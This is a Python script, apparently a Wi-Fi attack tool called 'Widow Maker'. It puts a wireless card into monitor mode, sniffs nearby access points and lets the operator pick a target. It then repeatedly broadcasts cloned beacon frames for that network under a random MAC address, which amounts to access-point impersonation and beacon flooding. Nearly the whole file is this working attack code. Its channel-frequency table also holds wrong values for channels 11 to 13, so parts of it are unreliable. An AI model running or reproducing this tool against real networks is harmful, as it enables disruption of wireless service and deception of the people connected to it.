import time, threading, sys, os, random
from scapy.all import *
from termcolor import colored
from multiprocessing import Queue
import curses
import select
import pyric.pyw as pyw




#outside class because scapy doesn't play nice with self
def sniffer(que, rque, minchannel, maxchannel):
    card = pyw.getcard('mon0')
    channel = que.get()
    pyw.chset(card, channel)
    sniff(iface='mon0', prn=filter, timeout=0.3)
    rque.put(channel)

def filter(pkt):
    if pkt.haslayer(Dot11Elt) and pkt[Dot11].type == 0 and pkt[Dot11].subtype in [5,8,11]:

            # Grab SSID
            SSID = (pkt[Dot11Elt].info).decode('utf-8')

            if SSID != None and SSID != "" :
                if SSID not in clients.keys():
                    # Setup counters
                    clients[SSID]['#'] = len(clients)
                    clients[SSID]['Channel'] = set([getchannel(pkt)])
                    clients[SSID]['Probes'] = 0
                    clients[SSID]['Beacons'] = 0
                    clients[SSID]['Auth'] = 0
                    clients[SSID]['Total'] = 0
                    clients[SSID]['Sent'] = 0

                    # Capture MAC addresses
                    clients[SSID]['MAC'] = pkt[Dot11].addr2

                    # Generate a random one too,
                    clients[SSID]['RMAC'] = str(RandMAC())

                elif pkt[Dot11].subtype == 5:
                    clients[SSID]['Probes'] +=1

                elif pkt[Dot11].subtype == 8:
                    clients[SSID]['Beacons'] +=1

                elif pkt[Dot11].subtype == 11:
                    clients[SSID]['Auth']  +=1

                clients[SSID]['Channel'].add(getchannel(pkt))
                clients[SSID]['Total'] += 1
                clients[SSID]['PKT'] = pkt

def getchannel(pkt):
    # 802.11 Channel mappings
    freqtochan = {2412: 1, 2417: 2, 2422: 3, 2427: 4, 2432: 5, 2437: 6, 2442: 7, 2447: 8,
                  2452: 9, 2457: 10, 2562: 11, 2567: 12, 2572: 13, 2484: 14}

    # The channel position in the not decoded bytes
    raw = pkt[RadioTap].notdecoded[18:20]

    # Classic little edian bytes, trying to ruin my day * [0] is because it returns a single element tuple
    freq = struct.unpack('H', raw)[0]

    # Check the mapping
    if freq in freqtochan.keys():

        # Return Channel if found
        return freqtochan[freq]

class Vividict(dict):
    def __missing__(self, key):
        value = self[key] = type(self)()
        return value

class widow():
    def __init__(self):
        self.wireless = pyw.getcard(sys.argv[1])
        self.channel = 1
        self.minchannel = 0
        self.maxchannel = 12
        self.timeout = 5
        self.target = None
        self.que = Queue()
        self.rque = Queue()
        self.mode = 'Scanning'
        self.interface = 'mon0'
        self.monitor_interface_setup()

    def monitor_interface_setup(self):
        card = pyw.getcard(self.interface)
        if pyw.isinterface(self.interface):
            try:
                pyw.devdel(card)
            except Exception as e:
                sys.exit(e)
        try:
            pyw.devadd(self.wireless, self.interface,'monitor')
            pyw.chset(card, self.channel)
            pyw.up(card)
        except Exception as e:
            sys.exit(e)

    def scanner(self):
        while self.mode == 'Scanning':
            try:
                self.printer()
                if self.que.empty():
                    for i in range(1, 12):
                        self.que.put(i)
                t = threading.Thread(target=sniffer, args=(self.que, self.rque, self.minchannel, self.maxchannel,))
                t.daemon = True
                t.start()
                self.channel = self.rque.get()
                time.sleep(0.2)
            except KeyboardInterrupt:
                self.mode = 'Select'

        if self.mode == 'Select':
            try:
                self.printer()
                x = (input('SSID Selection: '))
                for id in clients:
                    if clients[id]['#'] == int(x):
                        self.target = id
                        break

                if not isinstance(self.target, str):
                    print(colored('[!] Invalid Target Choice, Try Again' , 'red'))
                    time.sleep(1)
                    self.scanner()
                else:
                    self.mode = 'Hunting'
                    self.hunting()

            except KeyboardInterrupt:
                self.mode = 'Scanning'

    def hunting(self):
        #self.monitor_interface_removal()
        t = threading.Thread(target=ap_gen, args=(self.target,))
        t.daemon = True
        t.start()
        try:
            while True:
                self.printer()
                time.sleep(1)
        except KeyboardInterrupt:
            return

    def printer(self):
        # Clear the screen whenever we print
        os.system('clear')

        # Terminal size 0 is rows, 1 is columns
        columns = int(os.popen('stty size', 'r').read().split()[1])

        # Print the Banner
        for bannerline in banner.splitlines():
            print(colored('{} {}', 'green').format(' '*(round(columns/2-35)), bannerline))

        # Print the info summary
        print('#' * columns)
        print(colored('CURRENT STATUS: {} {}','blue').format(self.mode, '[CTRL-C TO STOP]'))

        # Each Mode
        if self.mode == 'Hunting':
            print(colored('[*] Beacon Frame Rate:  {} frames p/s', 'green').format(100))
            print(colored('[*] Target Access Point: {} ', 'green').format(self.target))
            print(colored('[*] Current Channel: {}', 'green').format(self.channel))
            print('#' * columns)
            print(colored('{:20} {:20} {:20} {:20} {:20}', 'blue').format('SSID:', 'MAC:', 'RMAC', 'SENT', 'CHANNELS'))
            for i in sorted(clients):
                if self.mode == 'Hunting' and i == self.target:
                    print(colored('{:20} {:20} {:20} {:<20} {!s:20}', 'red')
                          .format(i, clients[i]['MAC'], clients[i]['RMAC'], clients[i]['Sent'], clients[i]['Channel']))
            return

        if self.mode == 'Scanning':
            print(colored('[*] Current Channel: {}', 'green').format(self.channel))

        if self.mode == 'Select':
            print(colored('[*] Please make a selection from the below SSIDs:', 'green'))

        print('#' * columns)
        print(colored('{:^3} {:20} {:20} {:20} {:20} ', 'blue').format('#', 'SSID:', 'MAC:', 'FRAMES:', 'CHANNELS:'))
        for i in sorted(clients):
            print(colored('[{}] {:20} {:20} {:<20} {!s:20}', 'red')
                  .format(clients[i]['#'], i, clients[i]['MAC'], clients[i]['Total'], clients[i]['Channel']))

def ap_gen(SSID):
    # Copy so we leave orig intact
    ap_pkt = copy.deepcopy(clients[SSID]['PKT'])
    ap_pkt[Dot11].addr2 = clients[SSID]['RMAC']
    ap_pkt[Dot11].addr3 = clients[SSID]['RMAC']

    # Loop while the thread is active, sending at rate
    while True:
        time.sleep(1)
        sendp(ap_pkt, count=100, iface='mon0', verbose=False)
        clients[SSID]['Sent'] += 100

if __name__ == '__main__':
    banner = '''
     __    __ _     _                              _
    / / /\ \ (_) __| | _____      __   /\/\   __ _| | _____ _ __
    \ \/  \/ / |/ _` |/ _ \ \ /\ / /  /    \ / _` | |/ / _ \ '__|
     \  /\  /| | (_| | (_) \ V  V /  / /\/\ \ (_| |   <  __/ |
      \/  \/ |_|\__,_|\___/ \_/\_/   \/    \/\__,_|_|\_\___|_|
      '''

    try:
        interf = sys.argv[1]
    except:
        sys.exit(colored('[!] Need interface', 'red'))

    clients = Vividict()
    main = widow()
    main.scanner()
